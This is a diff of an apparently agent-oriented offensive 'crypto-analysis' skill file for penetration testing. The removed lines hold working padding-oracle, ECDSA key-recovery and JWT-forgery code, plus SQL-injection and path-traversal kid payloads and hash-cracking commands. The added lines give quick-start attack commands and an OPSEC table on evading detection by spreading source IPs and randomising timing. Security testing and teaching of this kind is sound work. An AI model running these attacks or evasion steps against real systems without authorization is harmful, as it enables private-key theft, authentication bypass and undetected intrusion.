@@ -1,433 +1,119 @@
 ---
 name: crypto-analysis
-description: Cryptographic assessment — cipher identification, TLS auditing, hash analysis, key strength evaluation, side-channel detection, crypto implementation review
+description: Cryptographic assessment — TLS/PKI auditing, RSA/ECC key attacks, ECDSA nonce lattice recovery, symmetric/AEAD misuse, JWT/JOSE forgery, hash cracking, and post-quantum migration review
 metadata:
   type: offensive
   phase: analysis
-  tools: openssl, testssl, hashcat, john, hashid, rsactftool
+  tools: testssl.sh, openssl, hashcat, john, RsaCtfTool, sagemath, jwt_tool, ecdsa-lattice
+  mitre: [T1600, T1600.001, T1557, T1110.002, T1552.004, T1606.001, T1040]
 kill_chain:
   phase: [recon, exploit]
   step: [1, 4]
-  attck_tactics: [TA0043, TA0006]
+  attck_tactics: [TA0043, TA0006, TA0009]
+  attck_techniques: [T1600, T1600.001, T1557, T1557.001, T1110.002, T1552.004, T1606.001, T1040]
 depends_on: [recon-osint]
-feeds_into: [exploit-development]
-inputs: [tls_config, crypto_implementation, hash_samples]
-outputs: [crypto_weakness_report, finding_record]
+feeds_into: [exploit-development, web-pentest, network-attack]
+inputs: [tls_config, crypto_implementation, hash_samples, public_keys, jwt_tokens, signature_corpus]
+outputs: [crypto_weakness_report, finding_record, recovered_keys, cracked_credentials]
+references:
+  - references/tls-pki-audit.md
+  - references/rsa-attacks.md
+  - references/ecc-nonce-attacks.md
+  - references/symmetric-aead.md
+  - references/jwt-jose.md
+  - references/hash-pq.md
+scripts:
+  - scripts/tls_audit.py
+  - scripts/rsa_attack.py
+  - scripts/ecdsa_lattice.py
+  - scripts/padding_oracle.py
+  - scripts/gcm_nonce_reuse.py
+  - scripts/jwt_forge.py
+  - scripts/hash_triage.py
 ---
 
 # Cryptographic Analysis
 
 ## When to Activate
 
-- Assessing cryptographic implementations in code
-- TLS/SSL configuration auditing
-- Hash cracking and identification
-- Key management review
-- Side-channel vulnerability assessment
-- CTF crypto challenges
+- Auditing TLS/SSL/SSH configurations and X.509 PKI (cipher suites, downgrade, protocol flaws)
+- Reviewing crypto implementations in source code or captured traffic
+- Attacking weak RSA/ECC keys (CTF and real-world weak-key hygiene)
+- Recovering ECDSA/DSA private keys from reused or biased nonces (lattice/HNP)
+- Exploiting symmetric/AEAD misuse: padding oracles, GCM nonce reuse, key-commitment
+- Forging JWT/JOSE tokens (algorithm confusion, none, jwk/jku/kid injection)
+- Cracking password hashes and grading KDF strength
+- Assessing post-quantum readiness ("harvest now, decrypt later" exposure)
 
-## Cipher & Hash Identification
+## Technique Map
 
-```bash
-# Hash identification
-hashid '$2b$12$LJ3m4sMKfRzG...'  # bcrypt
-hashid '5f4dcc3b5aa765d61d8327deb882cf99'  # MD5
-# hashcat mode reference:
-# 0=MD5, 100=SHA1, 1400=SHA256, 1800=SHA512crypt
-# 3200=bcrypt, 1000=NTLM, 5600=NetNTLMv2
-# 13100=Kerberoast, 18200=AS-REP, 22000=WPA-PBKDF2
+| Technique | ATT&CK | CWE | Reference | Script |
+|-----------|--------|-----|-----------|--------|
+| TLS cipher/protocol downgrade audit | T1600.001 | CWE-326 | references/tls-pki-audit.md | scripts/tls_audit.py |
+| Terrapin SSH prefix truncation (CVE-2023-48795) | T1557 | CWE-222 | references/tls-pki-audit.md | scripts/tls_audit.py |
+| Marvin/Bleichenbacher RSA timing oracle | T1600 | CWE-208 | references/tls-pki-audit.md | scripts/tls_audit.py |
+| X.509 / CT-log shadow-asset discovery | T1589 | CWE-295 | references/tls-pki-audit.md | scripts/tls_audit.py |
+| RSA weak-key factoring (Fermat/Wiener/common-modulus) | T1600 | CWE-326 | references/rsa-attacks.md | scripts/rsa_attack.py |
+| Coppersmith partial-key & ROCA (CVE-2017-15361) | T1600 | CWE-310 | references/rsa-attacks.md | scripts/rsa_attack.py |
+| Hastad broadcast / batch-GCD | T1600 | CWE-326 | references/rsa-attacks.md | scripts/rsa_attack.py |
+| ECDSA nonce reuse key recovery | T1552.004 | CWE-323 | references/ecc-nonce-attacks.md | scripts/ecdsa_lattice.py |
+| Biased-nonce lattice/HNP (Minerva, PuTTY CVE-2024-31497) | T1552.004 | CWE-1241 | references/ecc-nonce-attacks.md | scripts/ecdsa_lattice.py |
+| Psychic signature (0,0) (CVE-2022-21449) | T1606.001 | CWE-347 | references/ecc-nonce-attacks.md | scripts/ecdsa_lattice.py |
+| CBC padding oracle (byte-by-byte decrypt) | T1040 | CWE-209 | references/symmetric-aead.md | scripts/padding_oracle.py |
+| AES-GCM nonce reuse "forbidden attack" | T1040 | CWE-323 | references/symmetric-aead.md | scripts/gcm_nonce_reuse.py |
+| AEAD key-commitment / invisible salamanders / partitioning oracle | T1606 | CWE-347 | references/symmetric-aead.md | scripts/gcm_nonce_reuse.py |
+| JWT algorithm confusion RS256→HS256 (CVE-2024-54150) | T1606.001 | CWE-347 | references/jwt-jose.md | scripts/jwt_forge.py |
+| JWT alg=none / jwk / jku / kid injection | T1606.001 | CWE-347 | references/jwt-jose.md | scripts/jwt_forge.py |
+| Hash identification & GPU cracking | T1110.002 | CWE-916 | references/hash-pq.md | scripts/hash_triage.py |
+| Weak KDF / fast-hash password storage | T1110.002 | CWE-916 | references/hash-pq.md | scripts/hash_triage.py |
+| Post-quantum / HNDL exposure review | T1600 | CWE-327 | references/hash-pq.md | scripts/tls_audit.py |
 
-# Cipher identification
-# Look for: block size, key size, mode of operation
-# ECB: identical plaintext blocks → identical ciphertext blocks
-# CBC: IV required, padding oracle possible
-# GCM: authenticated, nonce-misuse catastrophic
-# CTR: stream cipher mode, nonce reuse = XOR of plaintexts
-```
-
-## TLS/SSL Auditing
-
-```bash
-# testssl.sh (comprehensive)
-testssl.sh --full https://target.com
-testssl.sh --vulnerable https://target.com
-
-# OpenSSL manual checks
-openssl s_client -connect target.com:443 -tls1_2
-openssl s_client -connect target.com:443 -cipher 'NULL:eNULL:aNULL'  # null ciphers
-openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -text -noout  # cert details
-
-# Check specific vulnerabilities
-# Heartbleed: openssl s_client -connect target:443 -tlsextdebug
-# POODLE: test SSLv3 support
-# ROBOT: test RSA key exchange
-# CRIME/BREACH: check TLS compression
-
-# Certificate analysis
-openssl x509 -in cert.pem -text -noout
-# Check: expiry, key size, signature algorithm, SAN, chain validity
-```
-
-## Hash Cracking
+## Quick Start
 
 ```bash
-# Hashcat
-hashcat -m 0 hashes.txt wordlist.txt                    # MD5 dictionary
-hashcat -m 0 hashes.txt wordlist.txt -r rules/best64.rule  # with rules
-hashcat -m 1000 hashes.txt wordlist.txt                 # NTLM
-hashcat -m 5600 hashes.txt wordlist.txt                 # NetNTLMv2
-hashcat -m 13100 hashes.txt wordlist.txt                # Kerberoast
-hashcat -m 22000 capture.hc22000 wordlist.txt           # WPA
+# 0. TLS/PKI posture in one shot (downgrade, ROBOT, SWEET32, Terrapin, cert/CT)
+python3 scripts/tls_audit.py target.com:443 --ssh target.com:22 --ct --json out.json
+testssl.sh --full --robot --sweet32 https://target.com   # cross-check with the canonical tool
 
-# Mask attacks (brute force with pattern)
-hashcat -m 0 hashes.txt -a 3 ?u?l?l?l?l?d?d?d?s        # Ullllddd!
-hashcat -m 0 hashes.txt -a 3 'Company?d?d?d?d'          # Company0000-9999
+# 1. RSA weak-key triage on a captured public key
+python3 scripts/rsa_attack.py --pubkey server.pem --ct ciphertext.b64 --auto
+#   tries Fermat (p~=q), Wiener (small d), batch-GCD/common-modulus, ROCA fingerprint
 
-# John the Ripper
-john --wordlist=wordlist.txt --format=raw-md5 hashes.txt
-john --rules --wordlist=wordlist.txt hashes.txt
+# 2. ECDSA key recovery from a signature corpus (reuse or bias)
+python3 scripts/ecdsa_lattice.py recover sigs.json --curve secp256r1 --known-msb 4
+#   reuse: needs 2 sigs w/ same r; bias: ~256-1200 sigs depending on leak
 
-# Common password patterns:
-# Season+Year: Summer2024!, Winter2025!
-# Company+digits: Company123!, Corp2024#
-# Keyboard walks: qwerty123, !QAZ2wsx
+# 3. Symmetric/AEAD misuse
+python3 scripts/padding_oracle.py --url https://t/dec --ct $CT --block 16   # CBC oracle
+python3 scripts/gcm_nonce_reuse.py forbidden ct1.bin ct2.bin --nonce $N     # recover H + forge
+
+# 4. JWT forgery chain
+python3 scripts/jwt_forge.py confusion --pubkey jwt_pub.pem --claims '{"role":"admin"}'
+python3 scripts/jwt_forge.py none      --claims '{"sub":"admin"}'
+
+# 5. Hash triage + crack plan
+python3 scripts/hash_triage.py hashes.txt            # identify + emit hashcat -m / john format
+hashcat -m 22000 capture.hc22000 wl.txt -r rules/best64.rule
 ```
 
-## Crypto Implementation Review
-
-### Common Vulnerabilities
-
-| Issue | Impact | Detection |
-|-------|--------|-----------|
-| ECB mode | Pattern leakage | Identical ciphertext blocks |
-| Static IV/nonce | Plaintext recovery | Hardcoded IV in code |
-| Nonce reuse (CTR/GCM) | Full plaintext recovery | Counter reset, random nonce collision |
-| No HMAC/authentication | Ciphertext manipulation | Encrypt without MAC |
-| Weak KDF | Brute-forceable keys | MD5/SHA1 of password directly |
-| Predictable randomness | Key/nonce prediction | Math.random(), time-based seeds |
-| Padding oracle | Byte-by-byte decryption | Different errors for bad padding vs bad data |
-| RSA without padding | Textbook RSA attacks | Direct RSA encrypt without OAEP |
-| Small RSA exponent | Cube root attack | e=3 with small message |
-| Shared RSA modulus | Factor via GCD | Multiple keys with common factors |
-
-### Code Patterns to Flag
-```python
-# DANGEROUS: ECB mode
-cipher = AES.new(key, AES.MODE_ECB)
-
-# DANGEROUS: Static IV
-iv = b'\x00' * 16
-cipher = AES.new(key, AES.MODE_CBC, iv)
-
-# DANGEROUS: Weak KDF
-key = hashlib.md5(password.encode()).digest()
-
-# DANGEROUS: No authentication
-ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(pt))
-# Missing: HMAC over ciphertext
-
-# DANGEROUS: Predictable randomness
-import random
-key = random.randbytes(32)  # NOT cryptographically secure
-
-# SAFE: Proper authenticated encryption
-from cryptography.fernet import Fernet  # AES-CBC + HMAC
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM  # AES-GCM
-```
-
-## RSA Attacks (CTF/Research)
-
-```python
-# Small public exponent (e=3, small message)
-import gmpy2
-m = gmpy2.iroot(c, 3)[0]  # cube root of ciphertext
-
-# Common modulus attack (same n, different e)
-# Extended GCD on e1, e2 → recover plaintext
-
-# Wiener's attack (small private exponent)
-# Continued fraction expansion of e/n
-
-# Fermat factorization (p ≈ q)
-# a = isqrt(n), check if a²-n is perfect square
-
-# Hastad's broadcast attack (same m, e recipients)
-# CRT on e ciphertexts → recover m^e → take e-th root
-
-# RSA-CTF-Tool (automated)
-python3 RsaCtfTool.py -n $N -e $E --uncipher $C
-```
-
-## Side-Channel Analysis
-
-```
-# Timing attacks:
-- String comparison: early termination leaks prefix length
-- Modular exponentiation: square-and-multiply timing differences
-- Cache timing: AES T-table access patterns
-
-# Power analysis:
-- Simple PA: directly observe key bits from power trace
-- Differential PA: statistical correlation across many traces
-
-# Detection in code:
-- Non-constant-time comparison (memcmp, strcmp, ==)
-- Branching on secret data (if key_bit: ...)
-- Variable-time operations on secrets
-- Table lookups indexed by secret data
-
-# Mitigations:
-- Constant-time comparison (crypto_memcmp, hmac.compare_digest)
-- Branchless implementations
-- Blinding (RSA, ECDSA)
-- Masking (AES)
-```
-
-## Advanced: Padding Oracle Attack Implementation
-
-```python
-import requests
-
-def padding_oracle_attack(url, ciphertext: bytes, block_size=16):
-    """Decrypt ciphertext byte-by-byte using padding oracle"""
-    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
-    plaintext = b''
-    
-    for block_idx in range(len(blocks)-1, 0, -1):
-        target_block = blocks[block_idx]
-        prev_block = bytearray(blocks[block_idx - 1])
-        intermediate = bytearray(block_size)
-        decrypted_block = bytearray(block_size)
-        
-        for byte_pos in range(block_size - 1, -1, -1):
-            padding_val = block_size - byte_pos
-            
-            # Set already-found bytes for correct padding
-            test_block = bytearray(block_size)
-            for k in range(byte_pos + 1, block_size):
-                test_block[k] = intermediate[k] ^ padding_val
-            
-            # Brute force current byte
-            for guess in range(256):
-                test_block[byte_pos] = guess
-                payload = bytes(test_block) + bytes(target_block)
-                
-                resp = requests.post(url, data=payload)
-                if resp.status_code != 400:  # Valid padding
-                    intermediate[byte_pos] = guess ^ padding_val
-                    decrypted_block[byte_pos] = intermediate[byte_pos] ^ prev_block[byte_pos]
-                    break
-        
-        plaintext = bytes(decrypted_block) + plaintext
-    
-    return plaintext
-
-# Attack complexity: 256 * block_size * num_blocks requests
-# 16-byte blocks, 3 blocks: ~12,288 requests max
-```
-
-## Advanced: Elliptic Curve Attacks
-
-### ECDSA Nonce Reuse
-```python
-# If same nonce k is used for two different messages → private key recovery
-# Given: (r, s1, hash1) and (r, s2, hash2) with same r (same k)
-
-from Crypto.Util.number import inverse
-
-def recover_key_from_nonce_reuse(r, s1, s2, hash1, hash2, n):
-    """Recover ECDSA private key from nonce reuse"""
-    # k = (hash1 - hash2) * inverse(s1 - s2, n) mod n
-    k = ((hash1 - hash2) * inverse(s1 - s2, n)) % n
-    # d = (s1 * k - hash1) * inverse(r, n) mod n
-    d = ((s1 * k - hash1) * inverse(r, n)) % n
-    return d
-
-# Detection: two signatures with identical r value → nonce reused
-# Historical: Sony PS3 used fixed k → complete ECDSA key recovery
-```
-
-### Biased Nonce Attack (Lattice-Based)
-```python
-# If ECDSA nonce has ANY bias (even a few bits) → key recovery via LLL
-# Example: top 8 bits of nonce always zero (biased PRNG)
-
-from sage.all import *
-
-def lattice_ecdsa_attack(signatures, public_key, n, bias_bits=8):
-    """Recover ECDSA private key from biased nonces
-    signatures: list of (r, s, hash) tuples
-    """
-    num_sigs = len(signatures)
-    
-    # Build lattice:
-    # For each sig: s_i * k_i = hash_i + r_i * d (mod n)
-    # k_i has top `bias_bits` bits as 0: k_i < n / 2^bias_bits
-    
-    B = Matrix(QQ, num_sigs + 2, num_sigs + 2)
-    
-    for i in range(num_sigs):
-        r_i, s_i, h_i = signatures[i]
-        t_i = (inverse_mod(s_i, n) * r_i) % n
-        u_i = (inverse_mod(s_i, n) * h_i) % n  # negated
-        B[i, i] = n
-        B[num_sigs, i] = t_i
-        B[num_sigs + 1, i] = u_i
-    
-    B[num_sigs, num_sigs] = 1
-    B[num_sigs + 1, num_sigs + 1] = n // (2 ** bias_bits)
-    
-    # LLL reduction
-    reduced = B.LLL()
-    # Private key is in reduced basis
-    return reduced
-```
-
-### Invalid Curve Attack
-```python
-# Force ECDH onto weak curve by sending points not on the curve
-# If implementation doesn't validate that received point is on curve:
-# Attacker sends point on a different (weak) curve
-# Shared secret computed on weak curve → small subgroup → discrete log easy
-
-# Attack flow:
-# 1. Find curves with small order subgroups
-# 2. Send points from these weak curves as "public keys"
-# 3. Victim computes shared secret on weak curve
-# 4. Solve discrete log on weak curve (small order → trivial)
-# 5. Reconstruct private key via CRT (combine multiple weak curve results)
-
-# Prevention: always validate that received point is on the expected curve
-# Check: y^2 = x^3 + ax + b (mod p)
-```
-
-## Advanced: AES Implementation Attacks
-
-### Cache Timing Attack on AES T-Tables
-```python
-# AES uses lookup tables (T-tables) indexed by key-dependent values
-# Cache line accessed depends on (plaintext ^ key) byte
-# By measuring cache access times → recover key bytes
-
-# Attack setup:
-# 1. Attacker and victim share CPU cache (same machine or VM)
-# 2. Flush shared cache lines (Flush+Reload) or prime (Prime+Probe)
-# 3. Victim encrypts attacker-chosen plaintext
-# 4. Measure which T-table entries were accessed
-# 5. Correlate with plaintext → deduce key bytes
-
-# Flush+Reload on OpenSSL AES:
-import ctypes, time
-
-def flush_reload_probe(table_addr, cache_line_size=64):
-    """Measure access time to determine if line is cached"""
-    # Flush: clflush(table_addr)
-    start = time.perf_counter_ns()
-    # Access: read(table_addr)
-    elapsed = time.perf_counter_ns() - start
-    # Cached: ~4-10 cycles, Uncached: ~200+ cycles
-    return elapsed < 50  # threshold in ns
-
-# Protection: constant-time AES (AES-NI hardware instructions)
-# AES-NI doesn't use lookup tables → immune to cache timing
-```
-
-### Bleichenbacher's Attack (RSA PKCS#1 v1.5)
-```python
-# Adaptive chosen-ciphertext attack on RSA with PKCS#1 v1.5 padding
-# Requires: padding oracle (server tells if decrypted padding is valid)
-# Result: full plaintext recovery in ~1 million queries
-
-# ROBOT attack (Return Of Bleichenbacher's Oracle Threat):
-# Modern variant — many TLS implementations still vulnerable
-# Test: send malformed RSA-encrypted premaster secret
-# Different error responses for bad padding vs bad data → oracle
-
-# Step 1: Multiplying ciphertext by s
-# c' = (c * s^e) mod n = (m * s)^e mod n
-# If server says padding valid → m*s starts with 0x00 0x02
-
-# Step 2: Narrow range of possible m values
-# Repeat with different s values
-# Each valid padding response halves the search space
-
-# Step 3: After ~O(log n) valid responses → recover exact m
-
-# testssl.sh detects this:
-# testssl.sh --robot target.com:443
-```
-
-## Advanced: Protocol-Level Crypto Attacks
-
-### TLS Downgrade Attacks
-```bash
-# POODLE: Force SSLv3 → CBC padding oracle
-# Test: testssl.sh --poodle target.com
-
-# DROWN: SSLv2 cross-protocol attack on TLS
-# If server shares RSA key between SSLv2 and TLS:
-# Decrypt TLS sessions using SSLv2 oracle
-# Test: testssl.sh --drown target.com
-
-# Logjam: DHE with 512/768-bit primes
-# Precompute discrete log for common primes
-# Real-time decryption of DHE sessions
-# Test: nmap --script ssl-dh-params target
-
-# SWEET32: Birthday attack on 64-bit block ciphers (3DES, Blowfish)
-# After 2^32 blocks (~32GB): block collision → plaintext recovery
-# Test: check for 3DES/Blowfish cipher suites
-
-# Raccoon attack (DH timing): measure DH key agreement timing
-# Different leading zero bytes → different processing time
-# Test: timing-based, requires many connections
-```
-
-### Certificate Attacks
-```bash
-# Self-signed cert acceptance (MITM)
-# Many clients skip certificate validation → intercept TLS
-
-# Certificate transparency log monitoring
-# Search CT logs for certificates issued for target domain
-# Find: shadow IT, staging environments, forgotten subdomains
-curl "https://crt.sh/?q=%25.target.com&output=json" | jq '.[].name_value'
-
-# OCSP stapling issues
-# If OCSP responder is down and server doesn't staple → soft-fail
-# Revoked certs still accepted during OCSP outage
-
-# Key reuse across services
-# Same RSA key on multiple servers → DROWN-style cross-protocol attacks
-# Find: scan all ports/services for matching public keys
-```
-
-## Advanced: Real-World Crypto Failures
-
-### JWT Vulnerabilities
-```python
-import jwt, json, base64
-
-# Algorithm confusion: RS256 → HS256
-# Server expects RS256 (asymmetric) but accepts HS256 (symmetric)
-# Sign with the PUBLIC key as HMAC secret → valid signature
-public_key = open('public.pem', 'r').read()
-forged = jwt.encode({"sub": "admin", "role": "admin"}, 
-    public_key, algorithm="HS256")
-
-# None algorithm
-header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
-payload = base64.b64encode(json.dumps({"sub": "admin"}).encode())
-forged = f"{header.decode()}.{payload.decode()}."  # empty signature
-
-# JWK injection (embed key in header)
-# Set "jwk" header to attacker's key → server uses it to verify
-
-# JKU/X5U injection (point to attacker key URL)
-# Set "jku" header to attacker URL hosting JWKS
-# Server fetches attacker's keys → verifies with attacker's key
-
-# Kid injection (key ID SQL injection or path traversal)
-# kid: "../../dev/null" → empty key → predictable HMAC
-# kid: "' UNION SELECT 'secret' --" → SQL injection in key lookup
-```
+## OPSEC & Detection (summary)
+
+| Technique | Telemetry / IOC | Detection (Sigma/EDR) | OPSEC note |
+|-----------|-----------------|-----------------------|------------|
+| TLS scanning / testssl | Burst of handshakes, many cipher renegotiations, malformed ClientHellos | NIDS: high TLS alert rate from one src; Zeek `ssl.log` anomalous cipher offers | Rate-limit, spread across source IPs; passive cert/CT recon leaves no target-side trace |
+| Marvin/ROBOT oracle probing | ~10^4–10^6 RSA decrypts, repeated malformed pre-master/CMS | WAF/IDS: spike of TLS decrypt errors, identical-size payloads | Extremely loud; only against authorized hosts; use minimal query budgets |
+| Terrapin MitM | Injected SSH_MSG_IGNORE, sequence-number gap at NEWKEYS | SSH server logs `kex` mismatch; netflow showing on-path device | Requires active MitM; detectable by strict-kex peers; abort if `kex-strict` present |
+| ECDSA nonce harvesting | Bulk signature collection (Git, TLS, SSH, blockchain) | Mostly offline — no target telemetry once sigs captured | Collection is passive; recovery is offline; rotate-key advice in report |
+| CBC padding oracle | Thousands of decrypt requests, alternating valid/invalid padding | Web logs: ~256×blocks requests to one endpoint; Sigma on 4xx burst | Very noisy (256×blocks×msgs); throttle, randomize timing |
+| GCM nonce reuse / partitioning | Repeated (nonce,key) pairs; multi-key ciphertext blobs | App crypto audit; flag reused IVs in logs | Forbidden-attack math is offline once two ciphertexts captured |
+| JWT forgery | Anomalous `alg`, external `jku`/`x5u` fetch, all-zero ES signature | Sigma: JWT with `alg:none`/HS after RS expected; egress to attacker JWKS URL | Each forged token is a single request; minimal noise |
+| Hash cracking | None on target (offline) | N/A unless online spray (then T1110) | Offline; protect loot at rest; never spray live without scope |
+
+## Deep Dives
+
+- **references/tls-pki-audit.md** — TLS/SSL/SSH posture: cipher/protocol downgrade, Terrapin (CVE-2023-48795), Marvin/Bleichenbacher (CVE-2022-4304, CVE-2024-2236), SWEET32/DROWN/Logjam/POODLE, X.509 and Certificate-Transparency analysis.
+- **references/rsa-attacks.md** — Weak-key factoring: Fermat, Wiener, common modulus, Hastad broadcast, Coppersmith partial-key, batch-GCD, ROCA (CVE-2017-15361); RsaCtfTool / cado-nfs / SageMath workflow.
+- **references/ecc-nonce-attacks.md** — ECDSA/DSA nonce reuse, biased-nonce lattice/HNP recovery (Minerva, PuTTY CVE-2024-31497), invalid-curve attacks, psychic signatures (CVE-2022-21449).
+- **references/symmetric-aead.md** — Block-cipher mode misuse: ECB detection, CBC padding oracle, CTR/GCM nonce reuse (forbidden attack), AEAD key-commitment / invisible salamanders / partitioning oracles.
+- **references/jwt-jose.md** — JWT/JOSE token forgery: algorithm confusion (CVE-2024-54150), alg=none, jwk/jku/x5u/kid injection, weak-secret cracking, library-level CVE landscape.
+- **references/hash-pq.md** — Hash identification, modern GPU cracking economics (RTX 40/50-series), KDF strength grading, and post-quantum migration / "harvest now, decrypt later" assessment (ML-KEM/ML-DSA, hybrid TLS, crypto-agility).
